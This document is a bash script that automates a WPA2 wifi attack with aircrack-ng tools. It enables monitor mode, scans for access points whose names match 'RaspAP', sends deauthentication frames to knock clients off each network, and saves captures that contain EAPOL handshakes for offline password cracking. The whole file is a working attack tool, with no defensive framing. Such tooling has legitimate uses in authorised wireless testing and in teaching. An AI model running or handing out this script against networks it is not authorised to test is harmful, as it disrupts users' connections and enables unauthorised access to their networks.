#!/bin/bash

IFACE="wlan1mon"
CAPDIR="./handshakes"
SCANFILE="scan_results.csv"
SCAN_TIME=10
CAPTURE_TIME=15
CSVFILE="scan-01.csv"
rm ${CSVFILE}
mkdir -p "$CAPDIR"
rm -f "$SCANFILE"
echo "Starting monitor on wlan1..."
airmon-ng start wlan1
echo "[*] Scanning for WPA2 access points with clients..."

echo "[*] Starting scan for $SCAN_TIME seconds..."
airodump-ng -c 1 --encrypt WPA2 --output-format csv -w scan --essid-regex RaspAP "$IFACE" &
SCAN_PID=$!

sleep "$SCAN_TIME"

echo "[*] Stopping scan..."
kill $SCAN_PID
sleep 2

if [[ ! -f "$CSVFILE" ]]; then
    echo "[!] Scan CSV not found!"
    exit 1
fi

echo "[*] Parsing AP list..."

# Extract APs from CSV: lines before the "Station MAC" section
# Skip hidden ESSIDs and empty channels
awk -F',' '
/^BSSID/ { next }
NF < 14 { next }
/^Station MAC/ { exit }
{
    bssid=gensub(/^ +| +$/, "", "g", $1)
    channel=gensub(/^ +| +$/, "", "g", $4)
    essid=gensub(/^ +| +$/, "", "g", $14)

    if (essid != "" && bssid ~ /([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}/ && channel ~ /^[0-9]+$/) {
        print bssid "," channel "," essid
    }
}' "$CSVFILE" > targets.txt

if [[ ! -s targets.txt ]]; then
    echo "[-] No WPA2 targets found."
    exit 1
fi

echo "[+] Found $(wc -l < targets.txt) targets."

mapfile -t targets < targets.txt

for entry in "${targets[@]}"; do
    IFS=',' read -r BSSID CHANNEL ESSID <<< "$entry"

    echo
    echo "[→] Targeting $ESSID ($BSSID) on channel $CHANNEL"
    SAFE_ESSID=$(echo "$ESSID" | sed 's/[^a-zA-Z0-9_-]/_/g')
    CAPFILE="$CAPDIR/${SAFE_ESSID}_${BSSID//:/}_handshake"
    rm -f "$CAPDIR/${SAFE_ESSID}_${BSSID//:/}"*
    # Start capture
    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAPFILE" "$IFACE" >/dev/null 2>&1 &
    DUMP_PID=$!

    sleep 7

    echo "[*] Sending deauth..."
    aireplay-ng --deauth 10 -a "$BSSID" "$IFACE"

    sleep "$CAPTURE_TIME"

    pkill -INT -P "$DUMP_PID"
    sleep 2

    FINAL_CAP="${CAPFILE}-01.cap"
    if [[ -f "$FINAL_CAP" ]]; then
        echo "[*] Checking $FINAL_CAP for handshake..."
        if tshark -r "$FINAL_CAP" -Y "eapol" | grep -q "EAPOL"; then
            echo "[+] Handshake captured for $ESSID"
        else
            echo "[-] No handshake for $ESSID. Deleting capture."
            rm -f "$FINAL_CAP"
        fi
    else
        echo "[-] No .cap file saved for $ESSID"
    fi
done

echo
echo "[✓] Done scanning. Valid handshakes saved in $CAPDIR."
echo "Stopping monitor mode on $IFACE"
airmon-ng stop "$IFACE"
